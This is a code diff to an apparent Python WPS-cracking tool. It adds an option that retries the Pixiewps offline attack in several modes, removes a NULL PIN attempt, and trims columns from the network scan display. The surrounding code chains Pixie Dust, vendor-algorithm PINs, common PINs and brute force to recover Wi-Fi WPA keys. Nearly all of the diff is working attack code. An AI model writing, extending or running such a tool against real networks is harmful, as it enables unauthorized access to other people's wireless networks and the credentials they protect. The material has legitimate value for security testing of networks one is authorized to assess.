@@ -578,6 +578,7 @@ class Companion:
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
+        self.pixie_another_method = False
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -740,29 +741,35 @@ class Companion:
         elif bssid and bssid in line and 'level=' in line:
             signal = line.split("level=")[1].split(" ")[0]
             self.lastPwr = signal
-            if 'noise=' in line:
-                noise = line.split("noise=")[1].split(" ")[0]
-                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
-            else:
-                print ("[i] Current signal: {}".format(signal))
 
         return True
 
-    def __runPixiewps(self, full_range=False):
+    def __runPixiewps(self, full_range=False, try_other_methods=False):
         self.__print_with_indicators('*', 'Running Pixiewps…')
-        cmd = self.pixie_creds.get_pixie_cmd(full_range)
-        print(cmd)
-        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                           stderr=sys.stdout, encoding='utf-8', errors='replace')
-        print(r.stdout)
-        if r.returncode == 0:
-            lines = r.stdout.splitlines()
-            for line in lines:
-                if ('[+]' in line) and ('WPS pin' in line):
-                    pin = line.split(':')[-1].strip()
-                    if pin == '<empty>':
-                        pin = "''"
-                    return pin
+        base_cmd = self.pixie_creds.get_pixie_cmd(full_range)
+
+        def _run(cmd):
+            print(cmd)
+            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                               stderr=sys.stdout, encoding='utf-8', errors='replace')
+            print(r.stdout)
+            if r.returncode == 0:
+                lines = r.stdout.splitlines()
+                for line in lines:
+                    if ('[+]' in line) and ('WPS pin' in line):
+                        pin = line.split(':')[-1].strip()
+                        if pin == '<empty>':
+                            pin = "''"
+                        return pin
+            return None
+
+        pin = _run(base_cmd)
+        if pin or not try_other_methods:
+            return pin or False
+        for mode in range(1, 8):
+            pin = _run(f"{base_cmd} --mode {mode}")
+            if pin:
+                return pin
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
@@ -908,7 +915,7 @@ class Companion:
             return True
         elif pixiemode:
             if self.pixie_creds.got_all():
-                pin = self.__runPixiewps(pixieforce)
+                pin = self.__runPixiewps(pixieforce, self.pixie_another_method)
                 if pin:
                     return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                 return False
@@ -1180,9 +1187,9 @@ class WiFiScanner:
                 colored('WPS code available', color='yellow'),
                 colored('WPS code can be from other models', color='orange')
             ))
-        print('\n🔥Networks list:\n')
-        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+        print('Networks list:')
+        print('{:<4} {:<18} {:<25} {:<27} {:<}'.format(
+            '#', 'BSSID', 'ESSID', 'WSC device name', 'WSC model'))
 
         network_list_items = list(network_list.items())
         if self.reverse:
@@ -1196,18 +1203,14 @@ class WiFiScanner:
             # Processing the display width of other fields
             processed_number = truncateStr(number, 4)
             processed_bssid = truncateStr(network['BSSID'], 18)
-            processed_security = truncateStr(network['Security type'], 8)
-            processed_level = truncateStr(str(network['Level']), 4)
             processed_device = deviceName  # 27 columns of width have been processed
             processed_model = model  # Assuming that the model fields do not need to be truncated or have been processed
-            
+
             # Directly concatenate the processed fields, separated by spaces in the middle
             line_parts = [
                 processed_number,
                 processed_bssid,
                 essid,
-                processed_security,
-                processed_level,
                 processed_device,
                 processed_model
             ]
@@ -1428,6 +1431,7 @@ def build_parser():
     parser.add_argument('--pin', type=str, help='Use the specified pin (arbitrary string or 4/8 digit pin)')
     parser.add_argument('--pixie-dust', action='store_true', help='Run Pixie Dust attack')
     parser.add_argument('--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
+    parser.add_argument('--pixie-another-method', action='store_true', help='Try additional Pixiewps modes if default fails')
     parser.add_argument('--bruteforce-pins', nargs='?', const=True, help='Bruteforce all pins when no file is given, otherwise try PINs from the specified file')
     parser.add_argument('--push-button-connect', action='store_true', help='Run WPS push button connection')
     parser.add_argument('--delay', type=float, help='Set the delay between pin attempts')
@@ -1457,6 +1461,7 @@ if __name__ == '__main__':
     while True:
         try:
             companion = Companion(args.interface, args.write, print_debug=args.verbose)
+            companion.pixie_another_method = args.pixie_another_method
             if args.push_button_connect:
                 companion.single_connection(pbc_mode=True)
             else:
@@ -1471,35 +1476,31 @@ if __name__ == '__main__':
                         essid = network.get('ESSID')
                 if args.bssid:
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                    companion.pixie_another_method = args.pixie_another_method
                     if args.pin:
                         companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
                     else:
-                        print('[*] Trying NULL PIN...')
-                        if companion.single_connection(args.bssid, '', pixiemode=False):
-                            print('[+] Connected with NULL PIN')
-                        else:
-                            TRIED_PINS.add('')
-                            if args.pixie_dust:
-                                print('[*] Trying Pixie Dust attack...')
-                                companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
-                            if companion.connection_status.status != 'GOT_PSK':
-                                model = network.get('Model', '') + network.get('Model number', '') if 'network' in locals() and network else ''
-                                device = network.get('Device name', '') if 'network' in locals() and network else ''
-                                if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device)):
-                                    if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid)):
-                                        if not try_pin_sequence(companion, args.bssid, COMMON_PINS):
-                                            if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p]):
-                                                if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p]):
-                                                    pins = generate_pins(mac=args.bssid, ssid=essid)
-                                                    if not try_pin_sequence(companion, args.bssid, pins):
-                                                        if isinstance(args.bruteforce_pins, str):
-                                                            print('[*] Trying PINs from file...')
-                                                            if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
-                                                                print('[-] All PIN attempts failed.')
-                                                        elif args.bruteforce_pins is True:
-                                                            companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                                                        else:
+                        if args.pixie_dust:
+                            print('[*] Trying Pixie Dust attack...')
+                            companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
+                        if companion.connection_status.status != 'GOT_PSK':
+                            model = network.get('Model', '') + network.get('Model number', '') if 'network' in locals() and network else ''
+                            device = network.get('Device name', '') if 'network' in locals() and network else ''
+                            if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device)):
+                                if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid)):
+                                    if not try_pin_sequence(companion, args.bssid, COMMON_PINS):
+                                        if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p]):
+                                            if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p]):
+                                                pins = generate_pins(mac=args.bssid, ssid=essid)
+                                                if not try_pin_sequence(companion, args.bssid, pins):
+                                                    if isinstance(args.bruteforce_pins, str):
+                                                        print('[*] Trying PINs from file...')
+                                                        if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
                                                             print('[-] All PIN attempts failed.')
+                                                    elif args.bruteforce_pins is True:
+                                                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                                                    else:
+                                                        print('[-] All PIN attempts failed.')
             if not args.loop:
                 break
             else:
